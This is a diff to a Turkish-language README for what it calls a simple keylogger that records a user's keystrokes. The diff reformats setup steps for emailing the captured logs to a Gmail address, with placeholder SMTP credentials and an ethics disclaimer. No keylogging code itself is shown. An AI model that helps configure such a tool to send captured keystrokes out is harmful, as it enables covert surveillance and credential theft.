@@ -17,11 +17,12 @@ Bu, basit bir keylogger uygulamasıdır. Uygulama, kullanıcının tuş vuruşla
    client.Credentials = new System.Net.NetworkCredential("ornek@gmail.com", "BURAYA_OLUSTURDUGUNUZ_SIFRE");
     ```
 
-   3. E-posta gönderme hedefini ve alıcıyı belirleyin:
-```csharp
-mailMessage.From = new MailAddress("ornek@gmail.com");
-mailMessage.To.Add("ornek@gmail.com");
-```
+3. E-posta gönderme hedefini ve alıcıyı belirleyin:
+ 
+   ```csharp
+   mailMessage.From = new MailAddress("ornek@gmail.com");
+   mailMessage.To.Add("ornek@gmail.com");
+   ```
 
 **Lütfen unutmayın:** Bu tür bir yazılımın etik olmayan veya yasa dışı amaçlarla kullanılması kesinlikle tavsiye edilmez. Kötü amaçlı kullanım, gizlilik ihlallerine neden olabilir ve yasal sonuçlar doğurabilir.
 
